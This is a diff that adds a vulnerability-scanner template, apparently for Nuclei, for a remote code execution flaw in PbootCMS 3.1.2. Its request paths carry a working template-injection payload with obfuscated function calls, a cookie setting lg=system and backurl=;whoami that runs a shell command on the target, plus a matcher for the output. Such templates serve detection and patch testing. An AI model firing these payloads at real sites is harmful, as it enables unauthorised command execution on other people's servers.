@@ -1,0 +1,24 @@
+id: PbootCms-312-RCE
+info:
+  name: PbootCMS 3.1.2 版本RCE
+  author:
+  - l0ne1y
+  description: |-
+    PbootCms 3.1.2 RCE
+    PbootCMS是全新内核且永久开源免费的PHP企业网站开发建设管理系统,是一套高效、简洁、 强悍的可免费商用的PHP CMS源码,能够满足各类企业网站开发建设的需要。
+    在PbootCMS V3.1.2版本中存在RCE漏洞导致攻击者可利用该漏洞远程执行命令。
+  severity: critical
+  remediation: |-
+    ## 官方修复方案
+    升级至最新版本。
+requests:
+- matchers:
+  - type: regex
+    regex:
+    - (.*?)\s+<!doctype html>\s+<html lang="zh">
+  path:
+  - '{{BaseURL}}/index.php/keyword?keyword=}{pboot:if((get_lg/*-*/())/**/(get_backurl/*-*/()))}{/pboot:if}&backurl=;whoami'
+  - '{{BaseURL}}/?snakin=}{pboot:if((get_lg/*-*/())/**/(get_backurl/*-*/()))}{/pboot:if}&backurl=;whoami'
+  method: GET
+  headers:
+    Cookie: lg=system; PbootSystem=blr2stdputphajekcor68ii671;
